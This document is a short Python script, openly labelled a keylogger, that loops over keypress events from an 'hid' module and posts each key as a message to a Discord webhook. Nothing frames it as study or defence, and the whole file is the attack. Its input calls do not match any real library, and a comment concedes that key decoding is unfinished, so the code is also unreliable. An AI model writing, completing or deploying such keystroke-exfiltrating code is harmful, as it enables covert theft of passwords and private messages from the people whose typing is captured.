import urequests
import time
import hid

WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_url"
DELAY = 0.1  # Delay between keystrokes

# Function to send keystrokes to Discord
def send_to_discord(key):
    payload = {
        "content": f"Key pressed: {key}"
    }
    try:
        urequests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending data: {e}")

# Function to simulate keylogging and sending keystrokes
def keylogger():
    while True:
        for event in hid.get_event():
            if event.type == hid.KEYPRESS:
                key = event.key  # You may need to decode keypress events based on your system
                send_to_discord(key)
                time.sleep(DELAY)

# Run the keylogger
keylogger()
